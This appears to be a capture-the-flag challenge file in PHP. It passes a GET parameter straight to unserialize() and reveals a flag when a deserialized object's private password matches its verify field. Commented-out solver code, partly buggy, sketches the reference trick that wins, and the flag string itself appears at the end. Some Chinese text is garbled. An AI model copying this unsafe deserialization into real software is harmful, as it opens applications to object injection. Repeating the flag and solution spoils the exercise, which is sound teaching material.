<?php
include "flag3.php"; 
class funny{
    private $password;
    public $verify;
    function __wakeup(){
        global $nobodyknow;
        global $flag;
        $this->password = $nobodyknow;
        if ($this->password === $this->verify){
            echo $flag;
        } else {
            echo "浣犱笉澶鍟�??!";
        }
    }
}
if (isset($_GET['tryhackme'])){
$a = $_GET['tryhackme'];
unserialize($a);
} else {
    show_source(__FILE__);
}

$b = new funny();
echo serialize($b);

//下面代码块是用来构造反序列化
// class funny
// {
//     public $password;
//     public $verify;
//     function __wakeup()
//     {
//     }
// };
// $b = new funny();
// $b->verify = &$b->$password;

// echo serialize($a);
echo serialize($b);
// flag{7r1p13_3q4@1s_is_9reat!}